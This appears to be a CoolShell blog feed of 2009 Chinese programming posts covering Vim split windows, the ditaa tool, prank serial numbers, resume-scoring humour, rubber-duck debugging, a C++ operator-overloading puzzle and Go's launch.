<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%88%86%E5%B1%8F%E5%90%AF%E5%8A%A8Vim" title="分屏启动Vim">分屏启动Vim</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%85%B3%E9%97%AD%E5%88%86%E5%B1%8F" title="关闭分屏">关闭分屏</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%88%86%E5%B1%8F" title="分屏">分屏</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%A7%BB%E5%8A%A8%E5%85%89%E6%A0%87" title="移动光标">移动光标</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%A7%BB%E5%8A%A8%E5%88%86%E5%B1%8F" title="移动分屏">移动分屏</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%B1%8F%E5%B9%95%E5%B0%BA%E5%AF%B8" title="屏幕尺寸">屏幕尺寸</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%88%86%E5%B1%8F%E5%90%AF%E5%8A%A8Vim"></span>分屏启动Vim<span class="ez-toc-section-end"></span>
</h4>
<ol>
<li>使用大写的O参数来垂直分屏。
<pre><code>vim -On file1 file2 ...</code></pre>
</li>
<li>使用小写的o参数来水平分屏。
<pre><code>vim -on file1 file2 ...</code></pre>
</li>
</ol>
<p><strong>注释:</strong> n是数字，表示分成几个屏。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E9%97%AD%E5%88%86%E5%B1%8F"></span>关闭分屏<span class="ez-toc-section-end"></span>
</h4>
<ol>
<li>关闭当前窗口。
<pre><code>Ctrl+W c</code></pre>
</li>
<li>关闭当前窗口，如果只剩最后一个了，则退出Vim。
<pre><code>Ctrl+W q</code></pre>
</li>
</ol>
<h4>
<span class="ez-toc-section" id="%E5%88%86%E5%B1%8F"></span>分屏<span class="ez-toc-section-end"></span>
</h4>
<ol>
<li>上下分割当前打开的文件。
<pre><code>Ctrl+W s</code></pre>
</li>
<li>上下分割，并打开一个新的文件。
<pre><code>:sp filename</code></pre>
</li>
<li>左右分割当前打开的文件。
<pre><code>Ctrl+W v</code></pre>
</li>
<li>左右分割，并打开一个新的文件。
<pre>:vsp filename</pre>
</li>
</ol>
<h4>
<span class="ez-toc-section" id="%E7%A7%BB%E5%8A%A8%E5%85%89%E6%A0%87"></span>移动光标<span class="ez-toc-section-end"></span>
</h4>
<p>Vi中的光标键是h, j, k, l，要在各个屏间切换，只需要先按一下Ctrl+W</p>
<ol>
<li>把光标移到<strong>右边</strong>的屏。
<pre><code>Ctrl+W l</code></pre>
</li>
<li>把光标移到<strong>左边</strong>的屏中。
<pre><code>Ctrl+W h</code></pre>
</li>
<li>把光标移到<strong>上边</strong>的屏中。
<pre><code>Ctrl+W k</code></pre>
</li>
<li>把光标移到<strong>下边</strong>的屏中。
<pre><code>Ctrl+W j</code></pre>
</li>
<li>把光标移到<strong>下一个</strong>的屏中。.
<pre>Ctrl+W w</pre>
</li>
</ol>
<h4>
<span class="ez-toc-section" id="%E7%A7%BB%E5%8A%A8%E5%88%86%E5%B1%8F"></span>移动分屏<span class="ez-toc-section-end"></span>
</h4>
<p>这个功能还是使用了Vim的光标键，只不过都是大写。当然了，如果你的分屏很乱很复杂的话，这个功能可能会出现一些非常奇怪的症状。</p>
<ol>
<li>向右移动。
<pre><code>Ctrl+W L</code></pre>
</li>
<li>向左移动
<pre><code>Ctrl+W H</code></pre>
</li>
<li>向上移动
<pre><code>Ctrl+W K</code></pre>
</li>
<li>向下移动
<pre><code>Ctrl+W J</code></pre>
</li>
</ol>
<h4>
<span class="ez-toc-section" id="%E5%B1%8F%E5%B9%95%E5%B0%BA%E5%AF%B8"></span>屏幕尺寸<span class="ez-toc-section-end"></span>
</h4>
<p>下面是改变尺寸的一些操作，主要是高度，对于宽度你可以使用[Ctrl+W &lt;]或是[Ctrl+W &gt;]，但这可能需要最新的版本才支持。</p>
<ol>
<li>让所有的屏都有一样的高度。
<pre><code>Ctrl+W =</code></pre>
</li>
<li>增加高度。
<pre><code>Ctrl+W +</code></pre>
</li>
<li>减少高度。
<pre><code>Ctrl+W -</code></pre>
</li>
</ol>
<p><code>也许还有其它我不知道的，欢迎你补充。</code></p>
<p><code>（全文完）</code></p>
 ]]></content>
<pubDate>2009-11-07T11:39:53+08:00</pubDate>
<guid>https://coolshell.cn/articles/1679.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 把ASCII图转成图片 ]]></title>
<link>https://coolshell.cn/articles/1684.html</link>
<content><![CDATA[ 
<p style="text-align: left;">我们都知道有很多软件帮我们把图片转成ASCII码图，这里这个工具是帮我们把ASCII图转成漂亮的图片。这个开源的软件是一个用Java写成的一个命令行的工具。对于这个工具的目的，我个人以为如下：</p>
<ul style="text-align: left;">
<li>其一，可以把别人的ASCII图转成图片，于是更好看一些。</li>
<li>其二，你可以使用ASCII码画图，而不需要使用图片编辑器。</li>
<li>其三，因为是命令行，所以，你完全可以以脚本或程序的方法来作图了。</li>
</ul>
<p style="text-align: left;">这个工具软件叫ditaa，其网址是：<a href="http://ditaa.sourceforge.net/">http://ditaa.sourceforge.net/</a>。</p>
<p style="text-align: center;"><img alt="image placeholder" ><img alt="image placeholder" ></p>
<p style="text-align: left;">这个小工具支持一些语法定义，可以帮你更好地产生图片，如下所示：</p>
<p style="text-align: left;"><span id="more-1684"></span></p>
<p style="text-align: left;"><strong>圆角矩形</strong></p>
<table style="text-align: left;" border="0" cellspacing="15">
<tbody>
<tr>
<td align="center">
<pre>/--+
|  |
+--/</pre>
</td>
<td align="center"><img alt="image placeholder" ></td>
</tr>
</tbody>
</table>
<p style="text-align: center;">
</p>
<p style="text-align: left;"><strong>定义颜色</strong></p>
<table style="text-align: left;" border="0" cellspacing="15">
<tbody>
<tr>
<td>
<pre>Color codes
/-------------+-------------\
|cRED RED     |cBLU BLU     |
+-------------+-------------+
|cGRE GRE     |cPNK PNK     |
+-------------+-------------+
|cBLK BLK     |cYEL YEL     |
\-------------+-------------/</pre>
</td>
<td align="center"><img alt="image placeholder" ></td>
</tr>
</tbody>
</table>
<p style="text-align: center;">
</p>
<p style="text-align: center;">
</p>
<p style="text-align: center;">
</p>
<p style="text-align: left;"><strong>一些图示</strong></p>
<table style="text-align: left;" border="0" cellspacing="5">
<tbody>
<tr>
<th>名字</th>
<th>ASCII</th>
<th>图版</th>
<th>注释</th>
</tr>
<tr>
<td valign="top">文档</td>
<td align="center">
<pre>+-----+
|{d}  |
|     |
|     |
+-----+</pre>
</td>
<td><img alt="image placeholder" ></td>
<td valign="top">表示文件</td>
</tr>
<tr>
<td valign="top">存储</td>
<td align="center">
<pre>+-----+
|{s}  |
|     |
|     |
+-----+</pre>
</td>
<td><img alt="image placeholder" ></td>
<td valign="top">表示数据库或磁盘</td>
</tr>
<tr>
<td valign="top">输入<br>
输出</td>
<td align="center">
<pre>+-----+
|{io} |
|     |
|     |
+-----+</pre>
</td>
<td><img alt="image placeholder" ></td>
<td valign="top">输入/输出标志。</td>
</tr>
</tbody>
</table>
<p style="text-align: center;">
</p>
<p style="text-align: center;">
</p>
<p style="text-align: center;">
</p>
<p style="text-align: left;"><strong>线条设置</strong></p>
<table style="text-align: left;" border="0" cellspacing="15">
<tbody>
<tr>
<td>
<pre>----+  /----\  +----+
    :  |    |  :    |
    |  |    |  |{s} |
    v  \-=--+  +----+</pre>
</td>
<td align="center"><img alt="image placeholder" ></td>
</tr>
</tbody>
</table>
<p style="text-align: center;">
</p>
<p style="text-align: center;">
</p>
<p style="text-align: center;">
</p>
<p style="text-align: left;">
</p>
<p style="text-align: left;"><strong>线上的链接点</strong></p>
<table style="text-align: left;" border="0" cellspacing="15">
<tbody>
<tr>
<td>
<pre>*----*
|    |      /--*
*    *      |
|    |  -*--+
*----*</pre>
</td>
<td align="center"><img alt="image placeholder" ></td>
</tr>
</tbody>
</table>
<p style="text-align: left;">
</p>
<p style="text-align: left;">
</p>
<p style="text-align: center;">
</p>
<p style="text-align: left;"><strong>文本</strong></p>
<table style="text-align: lef;" border="0" cellspacing="15">
<tbody>
<tr>
<td>
<pre>/-----------------\
| Things to do    |
| cGRE            |
| o Cut the grass |
| o Buy jam       |
| o Fix car       |
| o Make website  |
\-----------------/</pre>
</td>
<td align="center"><img alt="image placeholder" ></td>
</tr>
</tbody>
</table>
<p></p>
 ]]></content>
<pubDate>2009-11-08T00:20:03+08:00</pubDate>
<guid>https://coolshell.cn/articles/1684.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 给我一个序列号 ]]></title>
<link>https://coolshell.cn/articles/1693.html</link>
<content><![CDATA[ 
<p>下面这个链接是CodeSmith官网网站论坛上的一个贴子。<a href="http://community.codesmithtools.com/forums/p/10000/37140.aspx">http://community.codesmithtools.com/forums/p/10000/37140.aspx</a>。在这个贴子里，某位大哥问CodeSmith要一个序列号，一个叫Blake Niemyjski的人，可能是CodeSmith这家公司的客服人说回答到，如果要序列号，需要找他们的销售人员。</p>
<p>而这位老哥却说，“我要的是一个被破解的序列号，我手上有很多CodeSmith 5.0版的序列号，都可以使用，而你们把软件升级到了5.1，那些序列号都无法使用了”。客服人员无奈下，只得给出了下面的序列号：</p>
<p style="text-align: center;"><strong>CS50P-0NLY4-1D10T-W0ULD-TRYT0-45KU5-TH15Q</strong></p>
<p>当然，这个序列号并不行，而老哥没有发现这序列号中的端倪，继续问，后面，很多“热心网友”们都来帮忙，给了一些如下的序列号：</p>
<p style="text-align: center;">BL4K3-WH47K-1ND0F-700LI-57H1S-1DI07-4NYWY<br>
W3LLH-4S7H3-P3NNY-DR0PP-3D4UY-37U45-5WIP3<br>
UKINT-RYTH1-51FUH-AVAVR-Y5MAL-P3N1S<br>
1FUH4-VN0P3-N1STH-1S1S8-3TT3R-JU57K-1DD3N</p>
<p>呵呵，你看出这些序列号其中的含义了吗？呵呵。下面是翻译：</p>
<p><span id="more-1693"></span></p>
<p>CS50P-0NLY4-1D10T-W0ULD-TRYT0-45KU5-TH15Q<br>
CS5.0 Pro, Only an idiot would try to ask us this q （q的意思是question）</p>
<p>BL4K3-WH47K-1ND0F-700LI-57H1S-1DI07-4NYWY<br>
Blake, What kind of tool is this idiot anyway? （Blake就是那个客服）</p>
<p>W3LLH-4S7H3-P3NNY-DR0PP-3D4UY-37U45-5WIP3<br>
Well has the penny dropped for you yet? U asswipe.</p>
<p>UKINT-RYTH1-51FUH-AVAVR-Y5MAL-P3N1S<br>
You can try this if you have a very small penis.</p>
<p>1FUH4-VN0P3-N1STH-1S1S8-3TT3R-JU57K-1DD3N<br>
If you have no penis this is better just kidding.</p>
<p>上面的这些英文我就不翻译了，大家就算是看个乐吧。关于这样的恶搞，还有很多，大家可以看看《<a title="编程真难啊 - 3,812 次浏览" href="https://coolshell.cn/articles/1391.html">编程真难啊</a>》，还有《<a rel="bookmark" href="https://coolshell.cn/articles/1619.html">Windows 7 的新粉丝 Linus Torvalds</a>》</p>
 ]]></content>
<pubDate>2009-11-09T08:01:04+08:00</pubDate>
<guid>https://coolshell.cn/articles/1693.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 别的程序员是怎么读你的简历的 ]]></title>
<link>https://coolshell.cn/articles/1695.html</link>
<content><![CDATA[ 
<p><a href="https://coolshell.cn/wp-content/uploads/2009/11/resume_comic.png"></a>下面这个图片来源国外，是一个关于程序员面试时的简历，被人事部门和程序员本身评审的角度不同的图片。当然，这是一个从国外面试的视角制作的图片，不过，可以看出，其中很多东西都是和国内是相同的。让我们通过这个图片也来了解一下自身吧。</p>
<p align="center"><a href="https://coolshell.cn/wp-content/uploads/2009/11/resume_comic.png" target="_blank"><img alt="image placeholder" ></a></p>
<p>下面是我对其做的翻译，翻译水平有限，请大家指正。</p>
<p><span id="more-1695"></span></p>
<h4>人事部门是这样阅读简历的</h4>
<ul>
<li>（+15分）如果简历中说到了和工作职位相符的技能超过5次以上。</li>
<li>（+8分）如果简历中说到了和工作职位相符的技能3次到5次。</li>
<li>（+4分）如果简历中说到了和工作职位相符的技能1次到2次。</li>
<li>（+4分）Cover Letter（“求职信”或“自荐信”）提到了招聘人员。</li>
<li>（+2分）简历中有Cover Letter（求职信）。</li>
<li>（-10分）没有提到和职位描述相关的技能。</li>
<li>（-15分）没有受过大专教育。</li>
</ul>
<h4>程序员是这样阅读简历的</h4>
<ul>
<li>（+15分）曾经因为好玩而写过操作系统或编译器。</li>
<li>（+12分）简历被LaTeX编译过。</li>
<li>（+11分）为开源软件贡献过代码。</li>
<li>（+9分）上学的时候曾经写过操作系统或编译器。</li>
<li>（+8分）有一个BLOG分享技术知识。</li>
<li>（+8分）编程/机器人/工程俱乐部主席。</li>
<li>（+7分）编程/机器人/工程竞赛参与者。</li>
<li>（+7分）在Google和Microsoft实习过。</li>
<li>（+6分）使用动态语言（Python/Perl/Ruby）写过非试验性的程序。</li>
<li>（+5分）知道3种或多于3种的编程语言。</li>
<li>（+5分）之前的工作和目前的职位有很相似的经验。</li>
<li>（+4分）有过实习经验。</li>
<li>（+4分）自己创过业开过公司。</li>
<li>（+4分）有一个通过Rail, PHP或ASP.NET的个人主页。</li>
<li>（+3分）有一个自己域名的邮件地址。</li>
<li>（+3分）改过一些由动态语言（Python/Perl/Ruby）写的程序。</li>
<li>（+2分）有一个个人主页。</li>
<li>（+1分）高学历，学习成绩优秀，等。</li>
<li>（+0分）有奖学金。</li>
<li>（+0分）在快餐店工作过。</li>
<li>（-0.5分）Fackbook上有一张看上去喝醉了的照片。</li>
<li>（-1分）有博士头衔。</li>
<li>（-2分）有一个一般的求职信。</li>
<li>（-2分）在简历中说自己懂Word/Excel。</li>
<li>（-2分）在简历中有拼写和语法错误。</li>
<li>（-3分）简历的字体太小。</li>
<li>（-4分）所有的编程经验只是在学校中。</li>
<li>（-4分）只知道一门编程语言。</li>
<li>（-6分）简历有三页以上。</li>
<li>（-6分）简历中有一些无关的东西。</li>
<li>（-7分）得到过一些课程的认证。</li>
<li>（-8分）相关专业课程很低的成绩。</li>
<li>（-10分）在技能中，把Visual Basic列在第一的位置。</li>
<li>（-12分）在Facebook中，有过光膀子的照片。</li>
<li>（-15分）简历中的缩进同时使用了空格和Tab键。</li>
</ul>
<p>我个人觉得其中的很多东西真是说出了程序员的那种特性。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-11-09T10:22:23+08:00</pubDate>
<guid>https://coolshell.cn/articles/1695.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 橡皮鸭程序调试法 ]]></title>
<link>https://coolshell.cn/articles/1719.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >下面，让我来为你介绍一个程序调试大法——“橡皮鸭程序调试法”，这个方法在调试界是很出众的，实施起来相当方便和简易，几乎可以随时随地地实验，几乎不需要借助任何的软件和硬件的支持，你甚至可以把你的程序打印出来，在纸面上进行调试。</p>
<p>那么，为什么这个方法要叫做橡皮鸭呢？因为橡皮鸭子是西方人在泡澡时最喜欢玩的一个小玩具，所以，这个东西应该家家户户都必备的。因为，这个方法由西方人发明，所以，就被取名为“橡皮鸭”了。</p>
<p>好了，话不多说，下面是整个调试方法的流程。</p>
<ol>
<li>找一个橡皮鸭子。你可以去借，去偷，去抢，去买，自己制作……反正你要搞到一个橡皮鸭子。</li>
<li>把这个橡皮鸭子放在你跟前。标准做法是放在你的桌子上，电脑显示器边，或是键盘边，反正是你的跟前，面朝你。</li>
<li>然后，打开你的源代码。不管是电脑里的还是打印出来的。</li>
<li>对着那只橡皮鸭子，把你写下的所有代码，一行一行地，精心地，向这只橡皮鸭子解释清楚。记住，这是解释，你需要解释出你的想法，思路，观点。不然，那只能算是表述，而不是解释。</li>
<li>当你在向这只始终保持沉默的橡皮鸭子解释的过程中，你会发现你的想法，观点，或思路和实际的代码相偏离了，于是你也就找到了代码中的bug。</li>
<li>找到了BUG，一定要记得感谢一下那个橡皮鸭子哦。</li>
</ol>
<p>什么？你觉得这个方法太“愚蠢”，太“弱智”了？是的，看上去，会这样做的人脑子好像是有点毛病。不过，我要告诉你的是，这个方法的确有效。<strong>因为，这就是“Code Review”的雏形</strong>！下面让我来给你解释一下。</p>
<p><span id="more-1719"></span></p>
<blockquote><p>Once a problem is described in sufficient detail, its solution is obvious.</p></blockquote>
<p>上面这句话的意思是</p>
<blockquote><p>一旦一个问题被充分地描述了他的细节，那么解决方法也是显而易见的。</p></blockquote>
<p>我相信在座的各位都有过这样的经历，当你死活都找不到问题的原因的时候，当你寻求他人的帮助时，对别人解释整个你的想法和意图或是问题背景的时候，你自己都没有解释完，就已经找到问题的原因了。这样的经历，相信大家一定有过。这就是这个方法的意义所在。</p>
<p>所以，“橡皮鸭”只是一个形式，其主要目的是要你把自己写的代码做“自查”，也就是自己解释给自己听。当然，为了不让你像个“精神分裂”的程序员，引入“橡皮鸭”是很有必要的（虽然这样还是有点精神病，但比起精神分裂来说算是好的了，嘻嘻）。所以，真实的本质是Code Review。关于代码评审，大家可以看一下我的这篇文章《<a rel="bookmark" href="https://coolshell.cn/articles/1302.html">Code Review中的几个提示</a>》，你会明白其中更多的东西的。</p>
<p>最后，我想和大家说一下道具“橡皮鸭”。是的，在我们的身边，你不一定能找得“橡皮鸭”，但你可以找到你你的同事，你的朋友，来做这个“橡皮鸭”，当然，他们并不一定有“橡皮鸭”好使，因为你的那些同事或朋友一定会在你解释的时候，随意地发表意见和看法，相当的令人annoying。《<a rel="bookmark" href="https://coolshell.cn/articles/1302.html">Code Review中的几个提示</a>》和《<a rel="bookmark" href="https://coolshell.cn/articles/16.html">结对编程的利与弊</a>》也谈到了一些，供你借鉴。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-11-10T18:00:06+08:00</pubDate>
<guid>https://coolshell.cn/articles/1719.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Firefox插件WebMail Notifier ]]></title>
<link>https://coolshell.cn/articles/1714.html</link>
<content><![CDATA[ 
<p>当你的邮箱有新邮件时，WebMail Notifier此插件会自动提醒你。</p>
<p>支持：gmail, yahoo, hotmail, daum, naver, empas, nate等。</p>
<div id="addon-summary-wrapper">
<table border="0" summary="附加组件信息">
<tbody>
<tr>
<td rowspan="8"> <img alt="image placeholder" >
</td>
</tr>
<tr>
<th>版本</th>
<td>1.5.3</td>
</tr>
<tr>
<th>兼容版本</th>
<td>Firefox: 1.5 – 3.7a1pre</td>
</tr>
<tr>
<th>已更新</th>
<td><span title="2009 年 10 月  8 日 08:16">2009 年 10 月 8 日 </span></td>
</tr>
<tr>
<th>开发者</th>
<td><a href="https://addons.mozilla.org/zh-CN/firefox/user/104093" target="_blank">Byungwook Kang</a></td>
</tr>
<tr>
<th>主页</th>
<td><strong><a href="http://webmailnotifier.mozdev.org/" target="_blank">http://webmailnotifier.mozdev.org/</a> </strong></td>
</tr>
<tr>
<th>评分</th>
<td>
<span title="评分 4 超过了 5 星">评分 4 超过了 5 星 </span><a href="https://addons.mozilla.org/zh-CN/firefox/addon/4490#reviews" target="_blank"><strong>728</strong> 条意见 </a>
</td>
</tr>
<tr>
<th>下载次数</th>
<td><strong>3,239,874 </strong></td>
</tr>
</tbody>
</table>
</div>
<p>查看：<a href="https://addons.mozilla.org/zh-CN/firefox/addon/4490" target="_blank">https://addons.mozilla.org/zh-CN/firefox/addon/4490</a></p>
 ]]></content>
<pubDate>2009-11-11T11:36:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/1714.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 恐怖的C++语言 ]]></title>
<link>https://coolshell.cn/articles/1724.html</link>
<content><![CDATA[ 
<p><a href="https://coolshell.cn/wp-content/uploads/2009/11/cpp.jpg"><img alt="image placeholder" ></a> Linus曾经(2007年9月)在新闻组<a href="http://news.gmane.org/gmane.comp.version-control.git" target="_top">gmane.comp.version-control.git</a>里和一个微软的工程师（Dmitry Kakurin）争执过用C还是用C++，当时的那个微软的工程师主要是在做Git的Windows版，但他却发现Git的源码居然是C语言写的，而不是C++，于是他（Dmitry Kakurin）在Linux社区里发贴表示对Linux的不满，语言很直接：</p>
<blockquote>
<p style="padding-left: 30px;">Pure C as opposed to C++. No idea why. Please don’t talk about portability, it’s BS. （<span style="color: #008000;">纯C写的，而不是C++，不知道为什么，请别告诉我是为了移植性，这完全是胡扯</span>。）</p>
</blockquote>
<p>Linux之父Linus Torvalds马上跟贴，在贴子中，Linus言辞很直接，直接表明C++是一个很恐怖的语言，他在<a href="http://thread.gmane.org/gmane.comp.version-control.git/57643/focus=57918" target="_blank"><strong>贴子</strong></a>中说：</p>
<blockquote>
<p style="padding-left: 30px;"><strong>*YOU*</strong> are full of bullshit. C++ is a horrible language. It’s made more horrible by the fact that a lot of substandard programmers use it. （<span style="color: #008000;">你才是完全在胡扯。C++是一门很恐怖的语言，而比它更恐怖的是很多不合格的程序员在使用着它</span>）</p>
</blockquote>
<p>Linus的这个观点我是比较同意的，我个人也在几年前的《<a href="http://blog.csdn.net/haoel/archive/2004/06/23/24058.aspx" target="_blank">STL String类的写时才拷贝</a>》以及以后的一些文章中表达过C++的确并不是一个很成熟的语言，这种观点一直都围绕着我。这是因为它的学习成本实在是太高了，编译器和类背着你做了很多你不知道的事，而且，C++非常容易地出错和发生很多意想不到的问题。</p>
<p>当然，这篇文章并不是要继续声讨C++，也不是回顾以前的某个事件。我们这里只谈技术。昨天，我在网上看到一个邪恶的C++的示例，在这里给大家share一下，让大家看看C++这种编程语言的恐怖和邪恶的一面。下面的这个例子，比那个“#define  private  public”还更加邪恶。</p>
<p><span id="more-1724"></span></p>
<p>请看下面这段代码，你能告诉我它会输出什么吗？（注意main函数中高亮的那一行）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW" data-enlighter-highlight="28">#include &lt;iostream&gt;
#include &lt;vector&gt;

typedef int UINT4;
using namespace std;
class Hack
{
};

Hack&amp; operator&lt; (Hack &amp;a , Hack &amp;b)
{
    std::cerr &lt;&lt; "小于操作符\n";
    return a;
}

Hack&amp; operator&gt; (Hack &amp;a, Hack &amp;b)
{
    std::cerr &lt;&lt;  "大于操作符\n";
    return a;
}

int main(int argc, char ** argv)
{
    Hack vector;
    Hack UINT4;
    Hack foo;

    vector&lt;UINT4&gt; foo;

return(0);
}</pre>
<p style="text-align: left;"><img alt="image placeholder" >是的，上面这段代码如果只看main函数中的那句“vector&lt;UINT4&gt; foo”，你会觉得很眼熟，然而，事情并非那么简单，我们可以看到vector, UINT4和foo都是Hack类的实例，这就是邪恶的开始，那两个尖括号&lt; &gt;则成了两个运算符，大于和小于，这两个运算符却又被重载了。其实，真正的语句是：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">vector.operator&lt;(UNIT4).operator&gt;(foo);</code></p>
<p>所以，所有的一切都符合我们的C++的规范和语法，自然程序也能被顺利编译通过（至少，在我的G++上是没有问题的）。而整个程序的运行结果自然是：</p>
<p>[bash]$ ./horror<br>
小于操作符<br>
大于操作符[/bash]</p>
<p>是的，如果你通晓C++的一切的一切，你自然不会对这段程序感到惊奇。这样的事情在C/C++的世界中并不少见，要搞乱C/C++的代码并不是一件难事，花样多得数不胜数，只要看看《<a title="6个变态的C语言Hello World程序 - 4,749 次浏览" href="https://coolshell.cn/articles/914.html">6个变态的C语言Hello World程序</a>》你就知道了，而且，还有一个简单的教程《<a title="如何加密/混乱C源代码 - 2,420 次浏览" href="https://coolshell.cn/articles/933.html">如何加密/混乱C源代码</a>》告诉你一些简单的做法。</p>
<p>那么，如果你有一天在读程序中看到“vector&lt;UINT4&gt; foo”，你会觉得那只是一个幻觉吗？</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-11-11T12:06:25+08:00</pubDate>
<guid>https://coolshell.cn/articles/1724.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Go 语言：Google 的新编程语言 ]]></title>
<link>https://coolshell.cn/articles/1751.html</link>
<content><![CDATA[ 
<p><span style="color: #ff0000;">Go</span>ogle 今天发布了自制的编程语言，叫做Go，官方网站如下：</p>
<ul>
<li><a href="https://golang.org/">http://golang.org/</a></li>
</ul>
<p>主要参与者名单繁星满天：</p>
<ul>
<li>
<a href="https://en.wikipedia.org/wiki/Ken_Thompson">Ken Thompson</a> (Unix之父之一…好拗口)</li>
<li>
<a href="http://research.google.com/people/r/">Rob Pike</a> (Unix团队成员, 著书《 <em><a style="text-decoration: none; color: #002bb8; background-image: none; background-attachment: initial; background-origin: initial; background-clip: initial; background-color: initial; background-position: initial initial; background-repeat: initial initial;" title="The Practice of Programming" href="https://en.wikipedia.org/wiki/The_Practice_of_Programming">The Practice of Programming</a></em> 》and《 <em><a style="text-decoration: none; color: #002bb8; background-image: none; background-attachment: initial; background-origin: initial; background-clip: initial; background-color: initial; background-position: initial initial; background-repeat: initial initial;" title="The Unix Programming Environment (book)" href="https://en.wikipedia.org/wiki/The_Unix_Programming_Environment_(book)">The Unix Programming Environment</a></em>》)</li>
<li>等等</li>
</ul>
<p>Logo图标 (一只 <span style="color: #ff0000;">Go</span>pher, 金花鼠，作者 <a style="color: #3333cc;" href="https://reneefrench.blogspot.com/" target="_blank">Renée French</a>)<br>
<img alt="image placeholder" ></p>
<p>为什么Google要做自己的编程语言呢？</p>
<ul>
<li>快，安全，处理并发 （其余的<a href="https://golang.org/doc/go_talk-20091030.pdf">讲义在此</a>）</li>
</ul>
<p>似乎Google内部官方编程语言之战在即… C, C++, Java, Python, JavaScript, and now <a href="https://golang.org/">Go</a> and <a href="http://www.zimbu.org/">Zimbu</a>(by VIM 的作者)</p>
<p><a href="http://v.youku.com/v_show/id_XMTMxMzIwMTQ4.html">Go programming language Tech Talk</a></p>
 ]]></content>
<pubDate>2009-11-11T18:01:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/1751.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Go语言源码的一个改动 ]]></title>
<link>https://coolshell.cn/articles/1761.html</link>
<content><![CDATA[ 
<p>2009年11月11日，光棍节，<a href="https://coolshell.cn/articles/1751.html" target="_blank">Google发布了Go语言</a>，马上，就有网友在<a href="https://code.google.com/p/go/" target="_blank">http://code.google.com/p/go/</a>上找到了一个Go语言包文件操作源码/src/pkg/os/file.go文件的一个最新改动。这个改动的作者就是那个大名鼎鼎的Unix之父<a href="https://en.wikiquote.org/wiki/Kenneth_Thompson" target="_blank">Ken Thompson</a>（看看人家，都这么老了，还在写程序，佩服佩服，真是顶级程序员啊——《<a rel="bookmark" href="https://coolshell.cn/articles/343.html" target="_blank">程序员的八个级别</a>》），而这个改动的<a href="https://code.google.com/p/go/source/detail?r=4a3f6bbb5f0c6021279ccb3c23558b3c480d995f" target="_blank">Log Message</a>如下所示（把屏抓下来，以免以后某日被放到墙外或是google.com数据丢失或是Google公司倒闭）</p>
<p style="text-align: center;"><span style="font-size: large;">Spell it with an “e”<br>
</span><br>
<img alt="image placeholder" ></p>
<p> </p>
<p>这是一个很著名的典故，要知道这个典故，你需要知道两件事，一个是Ken Thompson的经典语录，一个是Unix的系统调用。</p>
<p><span id="more-1761"></span></p>
<p>关于Ken Thompson的经典语录，你可以在wikipdia上的<a href="https://en.wikiquote.org/wiki/Kenneth_Thompson" target="_blank">Ken Thompson</a>词条中找到，这个事情是这样的。</p>
<blockquote><p>Ken Thompson was once asked what he would do differently if he were redesigning the UNIX system. His reply: “<strong>I’d spell creat with an e.</strong>” （<span style="color: #008000;">Ken Thompson有一次在被问到——如果他可以重新设计Unix系统，他会做些什么不同的事？而他回答到：“我会把“creat”多拼一个e”</span>）</p></blockquote>
<p>“I’d spell creat with an e”，也就是说，他会把creat这个单词拼成<strong>creat</strong><span style="color: #ff0000;"><strong>e</strong><span style="color: #000000;">，而不是creat。为什么是creat呢，这需要我们来看一下creat这个系统调用，你可以在Unix或Linux下简单地<a href="https://linux.die.net/man/2/creat" target="_blank">man creat</a>你就可以知道，这个系统调用连带其某些参数，如：<strong>O_CREAT</strong>，都是一个少了“e”的create。（Unix下的有很多东西都是简写，如：usr，gp，ls，mv，ps，满大街的都是缩写）</span></span></p>
<p><span style="color: #ff0000;"><span style="color: #000000;">看看这个改动的<a href="https://code.google.com/p/go/source/diff?spec=svn1f0a01c93d305f1ab636c68b67346659c5b957f7&amp;r=4a3f6bbb5f0c6021279ccb3c23558b3c480d995f&amp;format=side&amp;path=/src/pkg/os/file.go&amp;old_path=/src/pkg/os/file.go&amp;old=50a1ee94151635c25ad76816044252af417a45b8" target="_blank">diff</a>——这个diff只有一行，第65行，抓屏如下（理由同上）</span></span></p>
<p style="text-align: center;"><span style="color: #ff0000;"><span style="color: #000000;"><img alt="image placeholder" ></span></span></p>
<p><span style="color: #ff0000;"><span style="color: #000000;">40年后的今天，Ken Thompson参与Go语言设计，于是，他提交了这个改动，也算是圆了他的愿望，从这点看来，Ken Thompson把Go语言看得和Unix一样重啊。难道Go语言也会像Unix一样成为另一个传奇？（Unix传奇 <a href="http://blog.csdn.net/haoel/archive/2007/03/27/1542340.aspx" target="_blank">上篇</a>，<a href="http://blog.csdn.net/haoel/archive/2007/03/27/1542353.aspx" target="_blank">下篇</a>）</span></span></p>
